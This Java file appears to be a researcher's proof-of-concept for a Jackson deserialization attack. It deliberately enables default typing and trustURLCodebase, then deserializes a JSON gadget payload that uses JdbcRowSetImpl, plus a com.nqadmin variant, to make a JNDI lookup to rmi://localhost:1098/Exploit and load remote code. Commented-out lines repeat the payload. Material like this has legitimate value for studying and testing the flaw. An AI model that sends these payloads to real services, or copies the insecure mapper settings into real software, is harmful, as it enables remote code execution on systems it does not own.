package com.jackson;

import java.io.IOException;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.sql.DataSource;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.JavaType;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.MapperFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.jackson.impl.Apple;
import com.jackson.impl.Banana;
import com.sun.rowset.JdbcRowSetImpl;

public class Test3 {

	public static void main(String[] args) throws NamingException, InterruptedException, IOException {

//		Apple apple = new Apple();
//		apple.setName("apple");
//
//		Banana banana = new Banana();
//		banana.setName("banana");
//
//		Buy buy = new Buy("online", banana);

		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		ObjectMapper objectMapper = new ObjectMapper();
		objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
//		String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1098/Exploit\",\"autoCommit\":true}";
		String json = "{\"@class\":\"com.nqadmin.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1098/Exploit\",\"autoCommit\":true}";
		objectMapper.readValue(json, Object.class);

		// String jsonString = objectMapper.writeValueAsString(buy);
		// System.out.println("toJSONString : " + jsonString);

		// String xx = "{\"@class\":\"com.jackson.impl.Banana\",\"name\":\"banana\"}";
		// Banana xxx = (Banana) objectMapper.readValue(xx, Object.class);
		// System.out.println(xxx.getName());
		// String xx2 =
		// "{\"@class\":\"com.nqadmin.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1098/Exploit\",\"autoCommit\":true}";

	}

}
